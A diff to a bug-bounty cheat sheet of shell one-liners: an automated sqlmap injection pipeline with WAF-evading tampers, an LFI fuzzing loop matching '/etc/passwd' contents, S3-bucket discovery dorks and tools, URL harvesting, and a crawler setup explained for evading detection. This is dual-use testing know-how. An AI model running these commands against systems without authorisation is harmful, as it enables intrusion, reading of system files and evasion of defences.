@@ -1,22 +1,23 @@
 # Bugbounty
 ## 2024 Oneliners found online
 
-## Check SQL
+### Check SQL
 waybackurls 'URL TARGET'| grep '='| httpx --silent --status-code| awk '{print $1}'| xargs -I{} sqlmap -u {} -v 3 --random-agent --tamper "between,randomcase,space2comment" --level 5 --risk 3 --batch --threads 5 --crawl 2 --suffix=') and 1=1-- -'
 
-## Screenshot
+### Screenshot
 cat hosts | gowitness scan file -f - --write-csv  
 ***
 
 ## 2025 Oneliners found online 
 
-## LFI
+## Find Local File Inclusion
 findomain -t example.com -q | waybackurls |gf lfi | qsreplace FUZZ | while read url ; do ffuf -u $url -mr “root:x” -w ~/wordlist/LFI.txt ; done
 ***
+---
 
-### FIND S3
+## FIND S3
 
-#### Google Dorking
+### Google Dorking
 (site:*.s3.amazonaws.com OR site:*.s3-external-1.amazonaws.com OR site:*.s3.dualstack.us-east-1.amazonaws.com OR site:*.s3.ap-south-1.amazonaws.com) "target.com"
 
 
@@ -25,18 +26,18 @@ Link: https://github.com/BullsEye0/dorks-eye
 - I forked the original. sudo-awk
 ***
 
-#### Using subfinder + httpx
+### Using subfinder + httpx
 
 subfinder -d target.com -all -silent | httpx-toolkit -sc -title -td | grep "Amazon S3"
 ***
 
-#### Find using JS files
+### Find using JS files
 
 katana -u https://site.com/ -d 5 -jc | grep '\.js$' | tee alljs.txt
 cat alljs.txt | xargs -I {} curl -s {} | grep -oE 'http[s]?://[^"]*\.s3\.amazonaws\.com[^" ]*' | sort -u
 
 ***
-#### Find using java2s3
+### Find using java2s3
 
 subfinder -d target.com -all -silent | httpx-toolkit -o file.txt
 cat file.txt | grep -oP '(?<=https?:\/\/).*'
@@ -52,7 +53,7 @@ You can also use this LazyS3 tool — it's basically a brute force tool for AWS 
 
 ***
 
-### Website you can use : 
+### Website you can use to find S3 Buckets: 
 
 https://osint.sh/buckets/
 grayhatwarefare
@@ -62,7 +63,9 @@ https://chromewebstore.google.com/detail/s3bucketlist/anngjobjhcbancaaogmlcffohp
 
 (site:*.s3.amazonaws.com OR site:*.s3-external-1.amazonaws.com OR site:*.s3.dualstack.us-east-1.amazonaws.com OR site:*.s3.ap-south-1.amazonaws.com) "target.com"
 ***
-### Get urls
+---
+
+## Get all urls fast
 
 waymore -i hackerone.com -mode U -oU hackerone_urls.txt
 
@@ -72,7 +75,46 @@ katana -u target.com | uro | tee -a urls.katana.out
 
 cat targets.txt | gau | sort | uro | tee -a targets.gau
 
-### credits to lostsec
+credits to lostsec
 ***
 
+## Spider the target fast
 
+katana -u http://[TARGET URL]/ -proxy http://[LOCALIP]:[BURPPROXYPORT]/ -hl -jc --no-sandbox -c 1 -p 1 -rd 3 -rl 5 -tlsi
+What it Does:
+
+🔸-u: Target URL:
+The web application or interface you want to crawl.
+
+🔸-proxy: Burp Proxy: 
+Sends all discovered requests through Burp for interception and analysis.
+
+🔸-hl: Headless mode: 
+Hooks internal headless browser calls to handle HTTP requests and responses directly within the browser context. 
+This provides two key benefits:
+◾Full browser-like fingerprinting (TLS/user-agent), avoiding automated detection.
+◾Enhanced discovery by analyzing both raw HTTP responses and JavaScript-rendered content.
+
+🔸-jc: JavaScript crawling. 
+Extracts endpoints from within JS files and runtime execution, improving endpoint visibility.
+
+🔸--no-sandbox: Sandbox bypass. 
+Bypasses browser sandbox restrictions—useful in restricted or containerized environments.
+
+🔸-c 1: Concurrency = 1. 
+Runs one request at a time to stay stealthy and mimic legitimate traffic.
+
+🔸-p 1: Parallelism = 1. 
+Prevents simultaneous thread execution, further reducing detection risk.
+
+🔸-rd 3: Recursion depth = 3. 
+Crawls up to 3 levels deep to uncover nested endpoints without overwhelming the server.
+
+🔸-rl 5: Rate limit = 5 req/sec. 
+Keeps request speed low enough to evade rate-based WAF triggers.
+
+🔸-tlsi: TLS fingerprint evasion. 
+Emulates real browser TLS behavior to bypass basic fingerprinting-based defenses.
+
+credits to blackhat ethical Hacking
+---
